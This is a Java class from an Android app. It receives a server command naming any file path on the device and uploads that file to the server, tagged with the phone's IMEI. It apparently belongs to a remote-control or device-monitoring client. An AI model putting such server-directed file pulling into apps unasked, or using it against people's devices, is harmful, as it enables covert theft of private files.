package com.network;

import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;

import com.network.NetworkLargeFile;
import com.network.ServerCommand;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;

import android.util.Log;

public class FileUploader {
	private static String TAG = "FileUploader";
	
	public static void fileUploader(byte[] recvbuf,int recvlen,int recvpacklen,InputStream ins,OutputStream ous){

		try {
			if (recvpacklen != recvlen) {
				WriteDateFile.writeLogFile("upload total size:" + recvpacklen + " first recv size:" + recvlen + "\r\n");
				return;
			}
			
			byte[] byteuploadfnlen = new byte[4];
			System.arraycopy(recvbuf, 24, byteuploadfnlen, 0, 4);
			int uploadfnlen = PublicFunction.bytesToInt(byteuploadfnlen);
			byte[] uploadfilename = new byte[uploadfnlen];
			System.arraycopy(recvbuf, 28, uploadfilename, 0, uploadfnlen);
			
			File uploadfile = new File(new String(uploadfilename));
			if (uploadfile.exists() == false ) {
				ServerCommand.sendCmdToServer("".getBytes(), ous, Public.FILE_TRANSFER_NOT_FOUND, Public.IMEI);
				Log.e(TAG,"upload file:" + uploadfile.getName() + " not found\r\n");
				WriteDateFile.writeLogFile("ServerCommand upload file:" + uploadfile.getName() + " not found\r\n");
			}
			else if(uploadfile.length() >= Public.MAX_TRANSFER_FILESIZE){
				ServerCommand.sendCmdToServer("".getBytes(), ous, Public.FILE_TRANSFER_TOO_BIG, Public.IMEI);
				Log.e(TAG,"upload file:" + uploadfile.getName() + " too big\r\n");
				WriteDateFile.writeLogFile("ServerCommand upload file:" + uploadfile.getName() + " too big\r\n");
			}
			else{
				
				NetworkLargeFile.SendNetworkLargeFile(new String(uploadfilename), ous, Public.IMEI, 
						Public.CMD_UPLOADFILE,Public.PacketOptNone);
				
				Log.e(TAG,"upload file:" + uploadfile.getName() + " ok\r\n");
				WriteDateFile.writeLogFile("ServerCommand upload file:" + uploadfile.getName() + " ok\r\n");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
